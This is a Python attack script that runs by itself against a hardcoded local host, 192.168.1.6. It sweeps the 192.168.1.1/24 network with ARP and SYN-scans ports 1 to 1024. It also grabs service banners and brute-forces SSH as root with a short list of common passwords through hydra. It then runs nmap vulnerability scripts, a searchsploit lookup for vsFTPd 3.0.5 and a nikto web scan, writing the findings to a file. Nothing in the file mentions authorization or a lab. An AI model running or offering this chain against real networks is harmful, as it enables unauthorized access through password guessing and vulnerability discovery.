import os
import socket
import subprocess
from scapy.all import ARP, Ether, srp, IP, TCP, sr1

target_ip = "192.168.1.6"
network_range = "192.168.1.1/24"
output_file = "scan_results.txt"

def write_to_file(data):
    with open(output_file, "a") as f:
        f.write(data + "\n")

# 1. Get Own IP Address
def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    write_to_file(f"Your IP: {ip_address}")
    return ip_address

# 2. Network Scan
def scan_network():
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=False)[0]
    
    devices = [(received.psrc, received.hwsrc) for sent, received in result]
    write_to_file("\nActive Devices:")
    for ip, mac in devices:
        write_to_file(f"IP: {ip}, MAC: {mac}")
    return devices

# 3. Port Scan
def scan_ports(target):
    open_ports = []
    for port in range(1, 1025):
        pkt = IP(dst=target)/TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=0)
        if resp and resp.haslayer(TCP) and resp.getlayer(TCP).flags == 0x12:
            open_ports.append(port)
    write_to_file("\nOpen Ports: " + str(open_ports))
    return open_ports

# 4. Banner Grabbing
def banner_grab(ip, port):
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((ip, port))
        banner = s.recv(1024).decode().strip()
        write_to_file(f"\nBanner for {ip}:{port} -> {banner}")
        s.close()
        return banner
    except:
        return None

# 5. Brute Force SSH (Aggressive Mode)
def brute_force_ssh(target):
    user = "root"
    passwords = ["123456", "password", "admin", "root", "toor", "letmein"]
    for pwd in passwords:
        cmd = f"hydra -l {user} -p {pwd} ssh://{target} -t 4"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if "successfully" in result.stdout:
            write_to_file(f"\n[+] SSH Cracked! User: {user}, Password: {pwd}")
            return
    write_to_file("\n[-] Brute Force Failed")

# 6. Nmap Vulnerability Scan
def nmap_vuln_scan(target):
    cmd = f"nmap -sV --script=vuln {target}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    write_to_file("\nNmap Vulnerability Scan Results:\n" + result.stdout)

# 7. Exploit Check for vsFTPd 3.0.5
def check_vsftpd_exploit(target):
    cmd = f"searchsploit vsftpd 3.0.5"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    write_to_file("\nExploit Check for vsFTPd 3.0.5:\n" + result.stdout)

# 8. Web Vulnerability Scan (Nikto)
def web_vuln_scan(target):
    cmd = f"nikto -h http://{target}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    write_to_file("\nWeb Vulnerability Scan (Nikto):\n" + result.stdout)

# Running Tasks
write_to_file("--- Full Security Scan Results ---")
get_ip()
scan_network()
open_ports = scan_ports(target_ip)
for port in open_ports:
    banner_grab(target_ip, port)
brute_force_ssh(target_ip)
nmap_vuln_scan(target_ip)
check_vsftpd_exploit(target_ip)
web_vuln_scan(target_ip)
